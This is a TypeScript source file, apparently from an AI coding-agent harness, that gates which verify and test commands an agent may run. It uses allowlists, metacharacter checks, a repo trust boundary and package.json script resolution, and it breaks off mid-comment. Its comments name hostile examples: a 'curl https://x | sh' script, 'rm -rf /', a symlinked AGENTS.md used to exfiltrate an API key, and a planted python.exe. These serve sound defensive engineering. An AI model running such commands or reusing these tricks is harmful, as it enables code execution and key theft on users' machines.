/**
 * Designated verify gate — Phase 5 (Prime pattern), thin seam.
 *
 * A task completes only after passing a designated verify gate. This seam
 * supports three gate kinds:
 *
 *  - `schema-validate`: validate a {@link TrajectoryDoc} or a {@link
 *    HarnessSkill} frontmatter with the existing pure validators. No network.
 *  - `command`: run an allowlisted relative command under `repoRoot` via
 *    `child_process` (no shell metacharacters, no `..`). Exit code 0 → passed.
 *  - `skip`: explicitly SKIP the gate. A skip is NOT a pass — {@link
 *    isVerifyPassed} returns false for `skipped`.
 *
 * HONESTY, binding: a verify result is one of `passed` / `failed` / `skipped`,
 * and ONLY `passed` counts. There is no "best-effort pass".
 */

import { spawnSync, type SpawnSyncReturns } from 'node:child_process';
import fs from 'node:fs';
import {
  validateHarnessSkill,
  type HarnessSkillFrontmatter,
} from '@sequence/schema';
import { isTrajectoryDoc, type TrajectoryDoc } from '../server/trajectoryStore.js';
import { canonicalRoot, resolveInRepo } from '../server/jail.js';
import { repoExecutionRefusal } from '../server/repoTrust.js';

/** The kinds of verify gate the thin seam supports. */
export type VerifyKind = 'schema-validate' | 'skip' | 'command';

/**
 * Allowlisted relative commands (no `..`, no shell metacharacters).
 *
 * ⚠ EVERY ENTRY HERE IS AN INDIRECTION, AND THAT IS THE POINT OF
 * {@link resolveRepoScript}. `pnpm test` is not a command — it is a lookup
 * into the repository's own `package.json`, which the repository writes. A
 * literal-string allowlist over an indirection is not an allowlist: nothing
 * hostile ever has to appear in the string, because the payload is in the file
 * the string resolves to (`docs/research/trust-boundary-verification.md` §2).
 *
 * This list is therefore no longer the whole gate. It names commands the
 * harness is willing to ASK FOR; what they MEAN is resolved out of the repo
 * and judged separately, and the repo has to be trusted before anything runs
 * at all.
 */
export const VERIFY_COMMAND_ALLOWLIST = [
  'pnpm test',
  'pnpm -r build',
  'pnpm build',
  'pnpm --filter @sequence/schema test',
] as const;

export type VerifyAllowlistedCommand = (typeof VERIFY_COMMAND_ALLOWLIST)[number];

export interface VerifyInput {
  kind: VerifyKind;
  /** Required for `command`; ignored by the other kinds. */
  cmd?: string;
  /**
   * Required for `command` — the repo root used as cwd. Ignored by other kinds.
   */
  repoRoot?: string;
  /**
   * The subject to validate for `schema-validate`. Either a parsed
   * {@link TrajectoryDoc} or a parsed skill frontmatter (the YAML block of a
   * `SKILL.md`). The validator is chosen by structural sniff, not a tag.
   */
  subject?: unknown;
  /** Timeout for `command` verify in milliseconds. Default 120_000. */
  commandTimeoutMs?: number;
}

export type VerifyStatus = 'passed' | 'failed' | 'skipped';

export interface VerifyResult {
  status: VerifyStatus;
  /** Human-readable reason for `skipped` or `failed`; absent for `passed`. */
  reason?: string;
  /** Validator error strings when `schema-validate` failed. */
  errors?: string[];
  /** Exit code when `command` failed. */
  exitCode?: number | null;
}

/**
 * Spawn a verify binary, resolving it the way the host platform actually needs.
 *
 * `shell: false` is deliberate and STAYS. `isSafeVerifyCommand` refuses shell
 * metacharacters precisely so no shell parses the command, and passing a shell
 * string to fix a lookup bug would trade a portability defect for an injection
 * surface.
 *
 * The cost on Windows is that `pnpm`, `npm`, `yarn` and `npx` are not
 * executables — they are `.cmd` shims. MEASURED on this machine, Node v24:
 *
 *     spawnSync('pnpm',     ['--version'], { shell:false })  ->  ENOENT
 *     spawnSync('pnpm.exe', ['--version'], { shell:false })  ->  ENOENT
 *     spawnSync('pnpm.cmd', ['--version'], { shell:false })  ->  EINVAL
 *     spawnSync('cmd.exe', ['/d','/s','/c','pnpm','--version'])  ->  0, "10.33.0"
 *
 * The EINVAL is not a missing file: since CVE-2024-27980 Node REFUSES to spawn a
 * `.cmd` or `.bat` without a shell. So appending the extension does not help, and
 * a first draft of this fix that only retried on ENOENT reported success while
 * still running nothing — the assertion has to be "it started", never "it was not
 * ENOENT".
 *
 * Every entry in `VERIFY_COMMAND_ALLOWLIST` begins with `pnpm`, so on Windows the
 * agent could start ZERO of its four verify commands. The verify step was not
 * merely repo-scoped, it was inert on the owner's own machine.
 *
 * The fallback runs `cmd.exe /d /s /c` in ARGV form — never a joined string —
 * with `/d` disabling AutoRun. Two independent gates already stand in front of
 * it: the command must match one of four exact allowlist constants, and
 * `isSafeVerifyCommand` rejects every metacharacter `cmd` would act on. The
 * direct spawn is tried first, so the fallback is reached only when the platform
 * genuinely cannot start the binary any other way.
 */
export function spawnVerifyBin(
  bin: string,
  args: readonly string[],
  opts: { cwd: string; timeout: number },
): SpawnSyncReturns<string> {
  const base = { cwd: opts.cwd, encoding: 'utf8' as const, timeout: opts.timeout, shell: false };
  const direct = spawnSync(bin, [...args], base);
  // A command that STARTED and failed is a real verify failure. Only a failure to
  // start is worth another attempt — retrying a non-zero exit would turn a red
  // gate green, which is far worse than the bug being fixed.
  if (!isSpawnLookupFailure(direct.error) || process.platform !== 'win32') return direct;
  return spawnSync('cmd.exe', ['/d', '/s', '/c', bin, ...args], base);
}

/**
 * True when the process never started. ENOENT is "no such binary"; EINVAL is
 * Node refusing a `.cmd`/`.bat` without a shell. Both mean nothing ran, and both
 * must be treated as a lookup failure rather than a command result.
 */
export function isSpawnLookupFailure(err: unknown): boolean {
  const code = (err as NodeJS.ErrnoException | undefined)?.code;
  return code === 'ENOENT' || code === 'EINVAL';
}

/** True when `cmd` is on the allowlist and contains no unsafe characters. */
export function isVerifyCommandAllowlisted(cmd: string): cmd is VerifyAllowlistedCommand {
  return (VERIFY_COMMAND_ALLOWLIST as readonly string[]).includes(cmd);
}

/** Reject path traversal and shell metacharacters in a command string. */
export function isSafeVerifyCommand(cmd: string): boolean {
  if (cmd.includes('..')) return false;
  if (/[;&|`$<>(){}[\]!#*?~]/.test(cmd)) return false;
  return cmd.trim().length > 0;
}

/**
 * Binaries the WIDENED run_command policy accepts — build/test runners and
 * interpreters, per ecosystem. Reached only from ask `run_command` under Full
 * permission (see `runAllowlistedRepoCommand`'s `widenToRunnerBins`); program
 * `command` nodes and every other caller keep the exact four-command allowlist.
 *
 * NO SHELLS, ON PURPOSE. `bash -c` would hand the safe-char check's job to a
 * parser that exists to defeat it. No file-ops either (`rm`, `cp`, `mv`) —
 * file changes go through `edit_file` and the repo jail, where they are
 * jailed, evented, and diffable. The list is honest about what it is NOT:
 * `pnpm run x` executes whatever package.json says, so this is not a sandbox —
 * Full permission is the consent to run project code, and this list only stops
 * the categories of command that have no test-running reading at all.
 */
export const RUNNER_BIN_ALLOWLIST = [
  'node', 'npx', 'npm', 'pnpm', 'yarn', 'bun', 'deno', 'tsc', 'vitest', 'jest',
  'python', 'python3', 'pytest', 'pip', 'pip3', 'uv', 'tox',
  'go', 'cargo', 'rustc',
  'make', 'cmake', 'ctest', 'ninja',
  'mvn', 'gradle', 'gradlew', 'java', 'javac',
  'dotnet',
  'ruby', 'bundle', 'rake',
  'php', 'composer', 'phpunit',
  'git',
] as const;

/** True when the command's argv[0] (basename, extensionless) is a known runner.
 *  `./tests/runtests.py`-style repo-relative scripts count as `python` work and
 *  are accepted when they end in a runner-owned extension. */
export function isRunnerCommand(cmd: string): boolean {
  const first = cmd.trim().split(/\s+/)[0] ?? '';
  const base = first.replace(/\\/g, '/').split('/').pop() ?? '';
  const bare = base.replace(/\.(exe|cmd|bat)$/i, '');
  if ((RUNNER_BIN_ALLOWLIST as readonly string[]).includes(bare)) return true;
  // A repo's own runner script, invoked directly: ./tests/runtests.py, ./gradlew
  if (/^\.\//.test(first) && /\.(py|mjs|cjs|js)$/i.test(bare)) return true;
  if (/^\.\/gradlew$/.test(first)) return true;
  return false;
}

/* ══════════════════════════════════════════════════════════════════════════
   RESOLVING THE INDIRECTION — "pnpm test" is whatever the repo says it is

   ── THE DECISION, AND WHY IT WENT THIS WAY ───────────────────────────────

   Two options were on the table: RESOLVE the indirection and show the real
   command, or REFUSE to allowlist an indirection at all. This is RESOLVE, for
   three reasons that are checkable rather than aesthetic:

     1. REFUSING INDIRECTIONS REFUSES EVERYTHING. `pytest` loads the repo's
        `conftest.py`. `make test` reads the repo's Makefile. `node x.js` runs
        the repo's JavaScript. Every useful verify command on every real
        project is an indirection into repo-controlled content; a rule against
        them is a rule we would have to break on the first Django checkout,
        and this file already carries the scar of exactly that (see
        `runAskDoneWhen`: `pnpm test` was the only runnable command, "which on
        a Django checkout is a refusal with extra steps").

     2. CONSENT IS WHAT MAKES RUNNING REPO CODE OK, AND IT NOW EXISTS. Before
        the trust boundary there was no moment at which the user said "this
        repo's code may run", so the allowlist was pretending to be that
        moment and failing. With `repoExecutionRefusal` in front of every
        spawn, an untrusted repo runs nothing at all, and a trusted one is a
        repository the user consented to. The allowlist stops carrying weight
        it was never able to hold.

     3. WHAT WAS ACTUALLY MISSING WAS VISIBILITY. The failure was not that
        `pnpm test` ran; it was that it ran while everyone believed it meant
        "the test suite". So the resolution is attached to every receipt —
        success and refusal alike — and the DECISION is made on the resolved
        text, not on the name.

   ── AND IT IS HONEST ABOUT WHAT IT CANNOT RESOLVE ────────────────────────

   Resolution is not total and must not pretend to be. This repository's own
   root script is `"test": "pnpm -r test"`, which fans out across every
   workspace package — each with its own script, each of which may fan out
   again. `resolveRepoScript` follows the chain while it has exactly one
   target, and STOPS with `unresolved` saying why when it does not. A receipt
   that says "not fully resolved: `pnpm -r test` fans out across the
   workspace" is worth more than a confident wrong answer, which is the
   `docs/CANON.md` rule about pinning numbers that move, applied to commands.
   ══════════════════════════════════════════════════════════════════════════ */

/** How many script→script hops to follow before calling it a loop. */
const SCRIPT_RESOLVE_MAX_HOPS = 4;

/** One hop of the chain: the command as written, and what the repo makes it mean. */
export interface ResolvedScriptHop {
  /** The command that was looked up, e.g. `pnpm test`. */
  command: string;
  /** Where the answer came from, e.g. `package.json scripts.test`. */
  via: string;
  /** What that file says the command is, verbatim. */
  script: string;
}

export interface ResolvedScriptChain {
  hops: ResolvedScriptHop[];
  /** The concrete command the chain ended on, or null when it did not end on one. */
  leaf: string | null;
  /** Why the chain stopped short. Present exactly when `leaf` is null. */
  unresolved?: string;
}

/**
 * Parse a package-manager script invocation into the script name it looks up,
 * or null when the command is not that kind of indirection.
 *
 * Handles `pnpm test`, `pnpm run build`, `npm run test`, `yarn test`,
 * `bun run x`, and the `--filter <pkg>` form. `-r` / `--recursive` is
 * recognised but reported as a FAN-OUT rather than a lookup, because it is one
 * command per workspace package and there is no single script to show.
 */
export function parseScriptInvocation(
  cmd: string,
): { script: string; filter?: string } | { fanout: string } | null {
  const parts = cmd.trim().split(/\s+/).filter((p) => p.length > 0);
  if (parts.length < 2) return null;
  const bin = (parts[0] ?? '').replace(/\.(cmd|exe|bat)$/i, '');
  if (!['pnpm', 'npm', 'yarn', 'bun'].includes(bin)) return null;

  let filter: string | undefined;
  let i = 1;
  for (; i < parts.length; i++) {
    const tok = parts[i]!;
    if (tok === '-r' || tok === '--recursive') return { fanout: cmd.trim() };
    if (tok === '--filter' || tok === '-F') {
      filter = parts[++i];
      continue;
    }
    if (tok.startsWith('--filter=')) {
      filter = tok.slice('--filter='.length);
      continue;
    }
    if (tok.startsWith('-')) continue; // any other flag: not our business
    break;
  }
  if (i >= parts.length) return null;
  let name = parts[i]!;
  if (name === 'run' || name === 'run-script') {
    name = parts[i + 1] ?? '';
    if (name === '') return null;
  } else if (!['test', 'build', 'start', 'lint'].includes(name)) {
    // `pnpm exec vitest`, `pnpm dlx x`, `pnpm install` — not a script lookup.
    return null;
  }
  return filter === undefined ? { script: name } : { script: name, filter };
}

/**
 * Read `scripts[name]` out of a package.json inside the repo.
 *
 * THROUGH THE JAIL, ALWAYS. `resolveInRepo` is the same gate
 * `readRepoInstructions` was moved onto in `14162f58` after a repo committing
 * `AGENTS.md -> ~/.sequence/openrouter-key` turned a text read into key
 * exfiltration. A repo can commit `package.json -> /anything` just as easily,
 * and this text is shown to the user as "what your command really runs" —
 * exactly the kind of text an attacker wants to control.
 */
function readScriptFrom(root: string, relPkg: string, name: string): string | null {
  const abs = resolveInRepo(root, relPkg);
  if (abs === null) return null;
  let parsed: unknown;
  try {
    parsed = JSON.parse(fs.readFileSync(abs, 'utf8'));
  } catch {
    return null;
  }
  const scripts = (parsed as { scripts?: unknown } | null)?.scripts;
  if (!scripts || typeof scripts !== 'object') return null;
  const value = (scripts as Record<string, unknown>)[name];
  return typeof value === 'string' && value.trim() !== '' ? value.trim() : null;
}

/** Repo-relative package.json paths to search for `--filter <pkg>`, shallow. */
function filterCandidates(root: string, filter: string): { rel: string; name: string }[] {
  const out: { rel: string; name: string }[] = [];
  for (const dir of ['packages', 'apps']) {
    const abs = resolveInRepo(root, dir);
    if (abs === null) continue;
    let entries: fs.Dirent[];
    try {
      entries = fs.readdirSync(abs, { withFileTypes: true });
    } catch {
      continue;
    }
    for (const e of entries) {
      if (!e.isDirectory()) continue;
      const rel = `${dir}/${e.name}/package.json`;
      const pkgAbs = resolveInRepo(root, rel);
      if (pkgAbs === null) continue;
      try {
        const parsed = JSON.parse(fs.readFileSync(pkgAbs, 'utf8')) as { name?: unknown };
        if (typeof parsed.name === 'string') out.push({ rel, name: parsed.name });
      } catch {
        /* not a readable package.json — nothing to offer */
      }
    }
  }
  return out.filter((c) => c.name === filter || c.rel.startsWith(`${filter}/`));
}

/**
 * Follow `cmd` through the repository's own package.json scripts.
 *
 * Returns null when `cmd` is not a package-manager script indirection at all
 * (`pytest -q`, `node --version`) — those are already what they look like.
 */
export function resolveRepoScript(cmd: string, repoRoot: string): ResolvedScriptChain | null {
  let root: string;
  try {
    root = canonicalRoot(repoRoot);
  } catch {
    return null; // no such root: the spawn is about to fail on its own terms
  }
  const hops: ResolvedScriptHop[] = [];
  let current = cmd.trim();
  const seen = new Set<string>();
  for (let hop = 0; hop < SCRIPT_RESOLVE_MAX_HOPS; hop++) {
    const parsed = parseScriptInvocation(current);
    if (parsed === null) {
      return hops.length === 0 ? null : { hops, leaf: current };
    }
    if ('fanout' in parsed) {
      return {
        hops,
        leaf: null,
        unresolved:
          `"${parsed.fanout}" runs once per workspace package, so there is no single ` +
          `script to show — each package's own package.json decides what it runs`,
      };
    }
    if (seen.has(current)) {
      return { hops, leaf: null, unresolved: `"${current}" resolves to itself — a script loop` };
    }
    seen.add(current);

    let relPkg = 'package.json';
    if (parsed.filter !== undefined) {
      const found = filterCandidates(root, parsed.filter);
      if (found.length !== 1) {
        return {
          hops,
          leaf: null,
          unresolved:
            found.length === 0
              ? `no package named "${parsed.filter}" was found under packages/ or apps/`
              : `"${parsed.filter}" matches ${found.length} packages`,
        };
      }
      relPkg = found[0]!.rel;
    }
    const script = readScriptFrom(root, relPkg, parsed.script);
    if (script === null) {
      return {
        hops,
        leaf: null,
        unresolved: `${relPkg} declares no "${parsed.script}" script`,
      };
    }
    hops.push({ command: current, via: `${relPkg} scripts.${parsed.script}`, script });
    current = script;
  }
  return {
    hops,
    leaf: null,
    unresolved: `still an indirection after ${SCRIPT_RESOLVE_MAX_HOPS} hops`,
  };
}

/** One line a person or a model can read: what the command actually is. */
export function describeScriptChain(chain: ResolvedScriptChain): string {
  const trail = chain.hops.map((h) => `${h.command} → ${h.via} = "${h.script}"`).join('; ');
  if (chain.leaf === null) {
    return trail === ''
      ? `not fully resolved: ${chain.unresolved ?? 'unknown'}`
      : `${trail}; not fully resolved: ${chain.unresolved ?? 'unknown'}`;
  }
  return trail === '' ? chain.leaf : trail;
}

/**
 * Is a resolved script something a test/build run could plausibly be?
 *
 * JUDGED PER SEGMENT, because a real script is a chain: `"test": "tsc &&
 * vitest run"` is ordinary and refusing it would make the gate useless on
 * most repositories, which is how gates get deleted. Each `&&` / `||` / `;` /
 * `|` segment must start with a binary from {@link RUNNER_BIN_ALLOWLIST}, so
 * `curl https://x | sh` fails on BOTH segments and `rm -rf /` fails on its
 * only one.
 *
 * Command substitution is refused outright: `$(…)` and backticks hide the
 * binary that actually runs, so a per-segment check of the visible text would
 * be checking the wrong string.
 */
export function isRunnerScript(script: string): boolean {
  if (/\$\(|`/.test(script)) return false;
  const segments = script
    .split(/&&|\|\||[;|\n]/)
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
  if (segments.length === 0) return false;
  return segments.every((seg) => isRunnerCommand(seg.replace(/^[A-Za-z_][A-Za-z0-9_]*=\S*\s+/, '')));
}

/** Shared stdout+stderr cap for allowlisted ask/program command runs. */
export const ALLOWLISTED_CMD_OUTPUT_CAP = 4_000;

/** Default wall-clock for a program/ask allowlisted spawn (ms). */
export const ALLOWLISTED_CMD_TIMEOUT_MS = 30_000;

/**
 * Result of {@link runAllowlistedRepoCommand}. `refuseReason` is set when the
 * command never started (unsafe / not allowlisted / spawn lookup failure).
 */
export interface AllowlistedCmdRun {
  ok: boolean;
  exitCode: number | null;
  output: string;
  refuseReason?: string;
  /**
   * What the command turned out to MEAN, when it was an indirection into the
   * repository's own package.json. Present on the run AND on the refusal, so a
   * receipt never shows the name without the behaviour — that gap is the whole
   * of `docs/research/trust-boundary-verification.md` §2.
   */
  resolved?: string;
}

/**
 * Run one exact allowlisted verify-gate command under `repoRoot` (no ambient
 * shell). Reused by ask `run_command` and program `command` nodes so neither
 * invents a second allowlist.
 */
export function runAllowlistedRepoCommand(
  cmd: string,
  repoRoot: string,
  opts?: { timeoutMs?: number; outputCap?: number; widenToRunnerBins?: boolean },
): AllowlistedCmdRun {
  /*
   * `cd <repo> && <cmd>` IS `<cmd>` — models write it reflexively, and every
   * ask command already executes at the repo root. Measured on SWE-bench: test
   * runs arrived as "cd /testbed && python -m pytest …" and the metacharacter
   * gate refused the whole thing, so the one behaviour we most want (running
   * the tests after an edit) was the one being blocked. Only a cd that targets
   * the root itself is stripped; a cd into a subdirectory would change the
   * command's meaning and is refused with the reason named.
   */
  /*
   * `2>&1` IS A NO-OP HERE — stdout and stderr are both captured for every
   * command — but models append it reflexively and the metachar gate refused
   * the whole run (measured: django-11790 probe, two verification attempts
   * lost to it). Trailing-position only; a redirect used as real plumbing in
   * the middle of a command still refuses.
   */
  cmd = cmd.trim().replace(/\s+2>&1\s*$/, '');
  if (!repoRoot || repoRoot.length === 0) {
    return { ok: false, exitCode: null, output: '', refuseReason: 'requires repoRoot' };
  }
  /*
   * ── THE TRUST BOUNDARY, AND IT IS FIRST ────────────────────────────────
   *
   * Every spawn in the product funnels through this function: ask
   * `run_command`, program `command` nodes, the done-when gate, and the
   * harness's own post-write syntax check. One gate here is a gate that cannot
   * be forgotten at a fourth call site — and the repo laws say a boundary at
   * three call sites is a boundary at two.
   *
   * IT IS CHECKED BEFORE THE ALLOWLIST, NOT AFTER. If the repository is
   * untrusted, nothing will run whatever the command says, and answering "not
   * allowlisted" would send a model into a rewrite loop against a command that
   * was never the problem. Name the real reason.
   *
   * THE POST-WRITE SYNTAX CHECK IS DELIBERATELY INSIDE THIS GATE. It spawns
   * `python`/`node` with cwd set to the repository root, and on Windows
   * `CreateProcess` searches the current directory before PATH — so a hostile
   * repo shipping `python.exe` at its root gets execution from a check that
   * was only meant to look at syntax. It is a lesser power than `run_command`
   * only if something ran first, which under this gate nothing does.
   */
  const untrusted = repoExecutionRefusal(repoRoot);
  if (untrusted !== null) {
    return { ok: false, exitCode: null, output: '', refuseReason: untrusted };
  }
  const cdPrefix = /^cd\s+("[^"]+"|'[^']+'|\S+)\s*&&\s*(.+)$/.exec(cmd.trim());
  if (cdPrefix) {
    const target = cdPrefix[1]!.replace(/^["']|["']$/g, '');
    const rootNorm = repoRoot.replace(/\\/g, '/').replace(/\/+$/, '');
    const targetNorm = target.replace(/\\/g, '/').replace(/\/+$/, '');
    if (targetNorm === '.' || targetNorm === rootNorm) {
      return runAllowlistedRepoCommand(cdPrefix[2]!, repoRoot, opts);
    }
    return {
      ok: false,
      exitCode: null,
      output: '',
      refuseReason:
        'commands always run at the repo root — drop the "cd" prefix (subdirectory cd would change what runs)',
    };
  }
  if (!isSafeVerifyCommand(cmd)) {
    return {
      ok: false,
      exitCode: null,
      output: '',
      refuseReason:
        'contains shell metacharacters or path traversal. Write the BARE command — output ' +
        '(stdout+stderr) is captured for you, so pipes, redirects, && and $() are never needed',
    };
  }
  /*
   * Two policies, one gate order. The exact four-command allowlist is the
   * default everywhere. `widenToRunnerBins` — set ONLY by ask `run_command`
   * under Full permission — additionally accepts commands whose binary is a
   * known build/test runner (RUNNER_BIN_ALLOWLIST). The safe-char check above
   * runs FIRST in both policies, so neither ever sees a shell metacharacter.
   *
   * This is what makes write→test→fix real outside this monorepo: `pnpm test`
   * was the only test command the agent could run, which on a Django checkout
   * is a refusal with extra steps.
   */
  if (!isVerifyCommandAllowlisted(cmd) && !(opts?.widenToRunnerBins && isRunnerCommand(cmd))) {
    return {
      ok: false,
      exitCode: null,
      output: '',
      refuseReason: opts?.widenToRunnerBins
        ? `not a recognised build/test runner: ${cmd} — the command must start with one of ${RUNNER_BIN_ALLOWLIST.join(', ')}`
        : `not allowlisted: ${cmd}`,
    };
  }
  /*
   * ── THE ALLOWLIST NOW JUDGES THE BEHAVIOUR, NOT THE NAME ───────────────
   *
   * `pnpm test` passed the check above because the STRING is on a list of
   * four. What it RUNS is whatever the repository's package.json says, and
   * that is the hole (`docs/research/trust-boundary-verification.md` §2). So
   * the indirection is followed here and the resolved script is judged by the
   * same runner rule a typed command faces: a repo whose `test` script is
   * `curl https://x | sh` is refused WITH THE RESOLVED TEXT NAMED, even though
   * `pnpm test` was on the list.
   *
   * A chain that cannot be fully resolved (`pnpm -r test` fans out per
   * workspace package) is NOT refused — the trust boundary is the consent for
   * running the repo's code, and refusing every monorepo would delete the
   * feature rather than secure it. It is REPORTED, on the receipt, saying
   * exactly what could not be resolved.
   */
  const chain = resolveRepoScript(cmd, repoRoot);
  const resolved = chain === null ? undefined : describeScriptChain(chain);
  if (chain !== null && chain.leaf !== null && !isRunnerScript(chain.leaf)) {
    return {
      ok: false,
      exitCode: null,
      output: '',
      ...(resolved !== undefined ? { resolved } : {}),
      refuseReason:
        `"${cmd}" is an indirection: ${resolved}. That is not a build/test runner, so it is ` +
        `refused even though "${cmd}" is allowlisted — the allowlist matches what a command ` +
        `DOES, not what it is called`,
    };
  }
  /*
   * QUOTE-AWARE ARGV, NOT split(' '). `python -c "import x"` and
   * `pytest -k "expr with spaces"` are how interpreters and runners are
   * actually invoked; naive splitting handed python the literal token
   * `"import` and reported a failure the code did not have. Double-quoted
   * segments group into one argument (quotes removed); no shell is ever
   * involved, so the quotes carry no other meaning here.
   */
  const parts: string[] = [];
  for (const m of cmd.matchAll(/"([^"]*)"|(\S+)/g)) {
    parts.push(m[1] !== undefined ? m[1] : m[2]!);
  }
  const bin = parts[0]!;
  const args = parts.slice(1);
  const timeout = opts?.timeoutMs ?? ALLOWLISTED_CMD_TIMEOUT_MS;
  const outputCap = opts?.outputCap ?? ALLOWLISTED_CMD_OUTPUT_CAP;
  const result = spawnVerifyBin(bin, args, { cwd: repoRoot, timeout });
  if (result.error) {
    return {
      ok: false,
      exitCode: null,
      output: result.error.message,
      ...(resolved !== undefined ? { resolved } : {}),
      refuseReason: `failed to start: ${result.error.message}`,
    };
  }
  const stdout = (result.stdout ?? '').toString();
  const stderr = (result.stderr ?? '').toString();
  const combined = `${stdout}${stderr ? `\n${stderr}` : ''}`;
  /*
   * HEAD + TAIL, NOT HEAD ALONE. A test runner prints its verdict LAST —
   * pytest's FAILED lines and summary, vitest's failure blocks, go test's
   * final ok/FAIL — so a head-only cap handed the model the banner and cut
   * the one part it could act on. A quarter of the budget keeps the header
   * (which suite, how collected); the rest keeps the verdict.
   */
  const headCap = Math.floor(outputCap / 4);
  const output =
    combined.length > outputCap
      ? `${combined.slice(0, headCap)}\n…(${combined.length - outputCap} chars omitted)…\n${combined.slice(combined.length - (outputCap - headCap))}`
      : combined;
  const exitCode = result.status ?? null;
  return {
    ok: exitCode === 0,
    exitCode,
    output,
    /* The receipt carries what the command MEANT, on success too. A resolution
       shown only on refusal teaches nobody what the green run actually ran. */
    ...(resolved !== undefined ? { resolved } : {}),
  };
}

/**
 * Run the designated verify gate. `schema-validate` and `skip` are pure (no
 * network). `command` executes an allowlisted cmd under `repoRoot`.
 */
export function runDesignatedVerify(input: VerifyInput): VerifyResult {
  switch (input.kind) {
    case 'skip':
      return {
        status: 'skipped',
        reason: input.cmd && input.cmd.length > 0 ? input.cmd : 'verify gate skipped by caller',
      };
    case 'schema-validate':
      return runSchemaValidate(input.subject);
    case 'command':
      return runCommandVerify(input);
    default:
      return { status: 'failed', reason: `unknown verify kind: ${String(input.kind)}` };
  }
}

/**
 * True ONLY for a `passed` verify result. `skipped` and `failed` both return
 * false — a skipped gate is never a pass.
 */
export function isVerifyPassed(result: VerifyResult): boolean {
  return result.status === 'passed';
}

/**
 * THE DONE-WHEN GATE — what a write turn must satisfy before it may call
 * itself finished.
 *
 * Declared here AND in `@sequence/api-types` (`PostAskRequest.doneWhen`), the
 * duplication `tools/ci/api-types.test.mjs` polices; change both identically.
 *
 *   - `command` — run `cmd` at the repo root after the turn's last write; exit
 *     0 is the only pass.
 *   - `skip`    — decline the gate ON THE RECORD. A skip is a recorded choice,
 *     never a default, which is why `reason` is required and an empty one is
 *     refused at parse time (`parseAskDoneWhen`) rather than defaulted.
 */
export type AskDoneWhen =
  | { kind: 'command'; cmd: string }
  | { kind: 'skip'; reason: string };

/**
 * One done-when run, as the turn reports it. `status` follows the verify
 * gate's law (only `passed` counts — see `isVerifyPassed`); the rest is the
 * receipt a reader needs to act: which command, its exit code and captured
 * output when it ran, or the gate's own `refuseReason` when it never started.
 * A refusal is reported as `failed` WITH `refuseReason` set, so a caller that
 * only reads `status` still cannot mistake it for a pass.
 */
export interface AskVerifyResult {
  status: VerifyStatus;
  /** Human-readable reason for `skipped`, `failed` or a refusal. */
  reason?: string;
  /** The command that ran (or was refused). Absent for `skip`. */
  cmd?: string;
  /** Exit code when the command ran; `null` when it never started. */
  exitCode?: number | null;
  /** Captured stdout+stderr (head+tail capped) when the command ran. */
  output?: string;
  /** Set when the gate refused to start the command — never a pass. */
  refuseReason?: string;
  /** What an indirection resolved to — see {@link AllowlistedCmdRun.resolved}. */
  resolved?: string;
}

/**
 * Narrow a wire-shaped `doneWhen` honestly. `undefined` means "no gate" and
 * is fine; anything else must be one of the two exact shapes. The one rule
 * this enforces beyond shape is the skip-reason law above: a `skip` with no
 * reason is an error, not a silent no-gate.
 */
export function parseAskDoneWhen(
  raw: unknown,
): { doneWhen?: AskDoneWhen } | { error: string } {
  if (raw === undefined || raw === null) return {};
  if (typeof raw !== 'object') return { error: 'doneWhen must be an object' };
  const v = raw as Record<string, unknown>;
  if (v.kind === 'command') {
    if (typeof v.cmd !== 'string' || v.cmd.trim().length === 0) {
      return { error: 'doneWhen.kind "command" requires a non-empty string "cmd"' };
    }
    return { doneWhen: { kind: 'command', cmd: v.cmd.trim() } };
  }
  if (v.kind === 'skip') {
    if (typeof v.reason !== 'string' || v.reason.trim().length === 0) {
      return {
        error:
          'doneWhen.kind "skip" requires a non-empty string "reason" — declining the gate is a recorded choice, not a default',
      };
    }
    return { doneWhen: { kind: 'skip', reason: v.reason.trim() } };
  }
  return { error: 'doneWhen.kind must be "command" or "skip"' };
}

/** Wall-clock for a done-when command — a real test suite, not a syntax check. */
export const DONE_WHEN_TIMEOUT_MS = 120_000;

/**
 * Run the done-when gate for a turn that wrote files.
 *
 * ROUTED THROUGH THE WIDENED RUNNER POLICY, ON PURPOSE. `runCommandVerify`
 * keeps the exact four-command allowlist, and the block comment inside
 * `runAllowlistedRepoCommand` records what that meant for run_command: every
 * entry begins with `pnpm`, so on a Django checkout the gate could run nothing
 * and was inert exactly where it mattered. A done-when of `pytest -q` has to be
 * runnable there or the gate is prompt-nudging with a type signature. The
 * safe-char check still runs first and shells are still refused; an
 * un-allowlisted command is REFUSED WITH THE REASON — never silently skipped,
 * and a refusal is not a pass.
 */
export function runAskDoneWhen(
  doneWhen: AskDoneWhen,
  repoRoot: string,
  opts?: { timeoutMs?: number; outputCap?: number },
): AskVerifyResult {
  if (doneWhen.kind === 'skip') {
    return { status: 'skipped', reason: doneWhen.reason };
  }
  const cmd = doneWhen.cmd;
  const ran = runAllowlistedRepoCommand(cmd, repoRoot, {
    widenToRunnerBins: true,
    timeoutMs: opts?.timeoutMs ?? DONE_WHEN_TIMEOUT_MS,
    ...(opts?.outputCap !== undefined ? { outputCap: opts.outputCap } : {}),
  });
  const withResolved = ran.resolved !== undefined ? { resolved: ran.resolved } : {};
  if (ran.refuseReason) {
    return {
      status: 'failed',
      cmd,
      exitCode: null,
      reason: `refused: ${ran.refuseReason}`,
      refuseReason: ran.refuseReason,
      ...withResolved,
    };
  }
  if (ran.ok) {
    return { status: 'passed', cmd, exitCode: ran.exitCode, output: ran.output, ...withResolved };
  }
  return {
    status: 'failed',
    cmd,
    exitCode: ran.exitCode,
    output: ran.output,
    reason: `exit ${String(ran.exitCode)}`,
    ...withResolved,
  };
}

function runCommandVerify(input: VerifyInput): VerifyResult {
  const cmd = input.cmd;
  if (!cmd || cmd.length === 0) {
    return { status: 'failed', reason: 'command verify requires a cmd' };
  }
  if (!isSafeVerifyCommand(cmd)) {
    return { status: 'failed', reason: 'command contains unsafe characters or path traversal' };
  }
  if (!isVerifyCommandAllowlisted(cmd)) {
    return { status: 'failed', reason: `command not allowlisted: ${cmd}` };
  }
  const repoRoot = input.repoRoot;
  if (!repoRoot || repoRoot.length === 0) {
    return { status: 'failed', reason: 'command verify requires repoRoot' };
  }
  /* THE SECOND SPAWN SITE. This branch calls `spawnVerifyBin` directly rather
     than going through `runAllowlistedRepoCommand`, so the boundary has to be
     stated here as well — the alternative is a gate with a documented bypass,
     which is not a gate. */
  const untrusted = repoExecutionRefusal(repoRoot);
  if (untrusted !== null) {
    return { status: 'failed', reason: untrusted };
  }
  /* And the same behaviour-not-name rule: a repo whose `test` script is not a
